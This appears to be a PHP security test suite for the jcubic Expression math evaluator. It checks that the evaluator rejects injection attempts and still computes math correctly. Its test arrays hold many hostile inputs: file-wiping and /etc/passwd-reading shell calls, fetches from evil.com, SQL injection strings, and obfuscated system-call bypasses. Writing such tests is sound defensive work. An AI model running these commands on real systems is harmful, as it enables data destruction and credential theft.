<?php

use jcubic\Expression;

describe('Expression Library - Security Penetration Tests', function () {
    it('blocks PHP code execution attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            '<?php system("ls"); ?>',
            '<?= system("whoami") ?>',
            '<? passthru("id") ?>',
            '<?php eval($_GET["cmd"]); ?>',
            'phpinfo()',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks shell command execution attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'exec("rm -rf /")',
            'shell_exec("cat /etc/passwd")',
            'system("whoami")',
            'passthru("ls -la")',
            'proc_open("malicious", [], [])',
            'popen("evil", "r")',
            '`ls -la`',
            'pcntl_exec("/bin/sh")',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks file system access attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'file_get_contents("/etc/passwd")',
            'file_put_contents("/tmp/evil", "hack")',
            'fopen("/etc/shadow", "r")',
            'fread($fp, 1024)',
            'readfile("/etc/hosts")',
            'file("/etc/passwd")',
            'include("/etc/passwd")',
            'include_once("evil.php")',
            'require("/tmp/evil.php")',
            'require_once("hack.php")',
            'unlink("/tmp/important")',
            'rmdir("/tmp")',
            'mkdir("/tmp/evil")',
            'chmod("/tmp/file", 0777)',
            'chown("/tmp/file", "root")',
            'copy("/etc/passwd", "/tmp/passwd")',
            'rename("/tmp/a", "/tmp/b")',
            'scandir("/etc")',
            'glob("/etc/*")',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks network access attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'file_get_contents("http://evil.com/shell.php")',
            'file_get_contents("https://attacker.com")',
            'fopen("http://evil.com", "r")',
            'curl_init("http://evil.com")',
            'curl_exec($ch)',
            'fsockopen("evil.com", 80)',
            'socket_create(AF_INET, SOCK_STREAM, SOL_TCP)',
            'socket_connect($sock, "evil.com", 80)',
            'gethostbyname("evil.com")',
            'dns_get_record("evil.com")',
            'getmxrr("evil.com", $hosts)',
            'stream_socket_client("tcp://evil.com:80")',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks database access attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'new PDO("mysql:host=localhost", "root", "")',
            'mysqli_connect("localhost", "root", "", "db")',
            'mysql_connect("localhost", "user", "pass")',
            'pg_connect("host=localhost")',
            'sqlite_open("/tmp/evil.db")',
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1'; DELETE FROM users WHERE '1'='1",
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks class instantiation attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'new Exception("test")',
            'new PDO("mysql:host=localhost")',
            'new ReflectionClass("User")',
            'new DateTime()',
            'new SplFileObject("/etc/passwd")',
            'new DirectoryIterator("/etc")',
            'new FilesystemIterator("/tmp")',
            '\\Exception::class',
            'new \\stdClass()',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks superglobal access attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            '$_GET["cmd"]',
            '$_POST["data"]',
            '$_SERVER["HTTP_HOST"]',
            '$_COOKIE["session"]',
            '$_SESSION["user"]',
            '$_FILES["upload"]',
            '$_ENV["SECRET_KEY"]',
            '$_REQUEST["param"]',
            '$GLOBALS["db"]',
            '$GLOBALS["_GET"]',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks reflection and introspection attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'get_defined_functions()',
            'get_defined_vars()',
            'get_defined_constants()',
            'get_loaded_extensions()',
            'get_included_files()',
            'class_exists("PDO")',
            'function_exists("system")',
            'method_exists($obj, "exec")',
            'get_class($obj)',
            'get_class_methods("User")',
            'get_object_vars($obj)',
            'property_exists($obj, "password")',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks serialization attacks', function () {
        $e = new Expression();
        $maliciousInputs = [
            'unserialize("O:8:\"User\":0:{}")',
            'serialize($object)',
            'var_export($obj)',
            'var_dump($data)',
            'print_r($array)',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks error manipulation attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'error_reporting(0)',
            'ini_set("display_errors", 1)',
            'set_error_handler("var_dump")',
            'set_exception_handler("system")',
            'register_shutdown_function("system")',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks filter bypass attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'base64_decode("c3lzdGVt")',  // system
            'hex2bin("73797374656d")',      // system
            'str_rot13("flfgrz")',          // system
            'gzinflate(base64_decode("encoded"))',
            'eval(base64_decode("evil"))',
            '$$var',
            '${$var}',
            '${system}',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('allows safe mathematical functions', function () {
        $e = new Expression();
        $safeFunctions = [
            ['expression' => 'sin(0)', 'expected' => 0],
            ['expression' => 'cos(0)', 'expected' => 1],
            ['expression' => 'sqrt(16)', 'expected' => 4],
            ['expression' => 'abs(-5)', 'expected' => 5],
            ['expression' => '2^3', 'expected' => 8],
        ];

        foreach ($safeFunctions as $test) {
            $result = $e->evaluate($test['expression']);
            expect($result)->toBeNumeric();
            expect(abs((float)$result - (float)$test['expected']))->toBeLessThan(0.0001);
        }
    });

    it('allows safe variable assignments for math', function () {
        $e = new Expression();

        // Test variable assignment
        $e->evaluate('a = 5');
        $result = $e->evaluate('a + 10');
        expect($result)->toEqual(15);

        // Test function definition
        $e->evaluate('f(x) = x^2 + 1');
        $result = $e->evaluate('f(3)');
        expect($result)->toEqual(10);
    });

    it('handles string operations safely', function () {
        $e = new Expression();

        // Test regex matching (should work as documented)
        $result = $e->evaluate('"Foo,Bar" =~ /^([fo]+),(bar)$/i');
        expect($result)->toBeTruthy();
    });

    it('blocks polyglot injection attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            '2+2; system("ls");',
            '2+2<?php system("ls"); ?>',
            '2+2/*<?php system("ls"); ?>*/',
            '2+2\n<?php system("ls"); ?>',
            '2+2\r\n<?php system("ls"); ?>',
            "2+2\x00<?php",
            '2+2` ls `',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                if ($result !== false && $result !== null) {
                    expect($result)->toEqual(4);
                }
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks resource manipulation attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'get_resource_type($res)',
            'is_resource($var)',
            'stream_get_wrappers()',
            'stream_wrapper_register("evil", "EvilClass")',
            'stream_context_create()',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks output buffer manipulation', function () {
        $e = new Expression();
        $maliciousInputs = [
            'ob_start()',
            'ob_get_contents()',
            'ob_end_clean()',
            'output_add_rewrite_var("session", "hacked")',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks control flow manipulation', function () {
        $e = new Expression();
        $maliciousInputs = [
            'exit()',
            'die()',
            'exit("hacked")',
            'die("pwned")',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('handles extremely nested expressions safely', function () {
        $e = new Expression();

        // Create deeply nested parentheses
        $deep = str_repeat('(', 50) . '1' . str_repeat(')', 50);

        try {
            $result = $e->evaluate($deep);
            // Should either work or return false, but not crash
            expect($result === 1 || $result === false)->toBeTrue();
        } catch (\Exception $ex) {
            // Acceptable to throw exception for too deep nesting
            expect($ex)->toBeInstanceOf(\Exception::class);
        }
    });

    it('blocks namespace manipulation attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            '\\system("ls")',
            '\\exec("whoami")',
            '\\PDO::__construct()',
            '\\ReflectionClass::export("User")',
            'namespace\\function()',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks variable function calls', function () {
        $e = new Expression();
        $maliciousInputs = [
            '$func = "system"; $func("ls")',
            '$${"sys"."tem"}("ls")',
            'call_user_func("system", "ls")',
            'call_user_func_array("exec", ["whoami"])',
            'forward_static_call("system", "ls")',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('blocks process control attempts', function () {
        $e = new Expression();
        $maliciousInputs = [
            'pcntl_fork()',
            'pcntl_exec("/bin/sh", [])',
            'proc_nice(19)',
            'proc_terminate($process)',
            'posix_kill($pid, 9)',
            'posix_getpwnam("root")',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('ensures math operations remain precise', function () {
        $e = new Expression();

        // Test precision is maintained for legitimate calculations
        $tests = [
            ['expr' => '0.1 + 0.2', 'check' => fn($r) => abs($r - 0.3) < 0.0001],
            ['expr' => '1000000 * 1000000', 'check' => fn($r) => $r == 1000000000000],
            ['expr' => '999999999999 + 1', 'check' => fn($r) => $r == 1000000000000],
        ];

        foreach ($tests as $test) {
            $result = $e->evaluate($test['expr']);
            expect($test['check']($result))->toBeTrue();
        }
    });

    it('blocks attempts to access internal expression state', function () {
        $e = new Expression();
        $maliciousInputs = [
            'self::class',
            'static::method()',
            'parent::method()',
            '__CLASS__',
            '__METHOD__',
            '__FUNCTION__',
            '__FILE__',
            '__DIR__',
            '__LINE__',
        ];

        foreach ($maliciousInputs as $input) {
            try {
                $result = $e->evaluate($input);
                expect($result)->toBeFalsy();
            } catch (\Exception $ex) {
                expect($ex)->toBeInstanceOf(\Exception::class);
            }
        }
    });

    it('sanitizes error messages to prevent information disclosure', function () {
        $e = new Expression();

        try {
            $result = $e->evaluate('invalid_function_that_does_not_exist()');
            expect($result)->toBeFalsy();
        } catch (\Exception $ex) {
            expect($ex)->toBeInstanceOf(\Exception::class);
        }
    });
});
